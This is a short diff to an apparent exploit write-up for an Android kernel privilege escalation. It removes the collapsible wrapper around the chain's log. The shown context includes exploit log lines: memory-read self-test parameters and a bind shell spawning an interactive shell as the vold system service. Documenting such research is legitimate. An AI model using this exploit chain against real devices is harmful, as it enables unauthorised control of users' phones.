@@ -274,8 +274,6 @@ failed above succeeds. That's the finish line. Not `uid=0`, but a shell in a dom
 something.
 
 Here's the full log of the chain:
-<details style="font-size: 0.75rem; color: #888; margin-top: 0.5rem;">
-
 ```
 [frk] uid=2000 pid=9783 linear_base=ffffff8000000000
 [aar] selftest: pressure=24000 cc_iters=5 dmabuf=64/round x60KB rounds=100 round_us=2000 use_pipes=0 no_read=0
@@ -431,7 +429,6 @@ frk_vold: [bindsh] client connected -> spawning /system/bin/sh -i as vold on the
 ```
 
 
-</details>
 
 
 ## A word about reliability
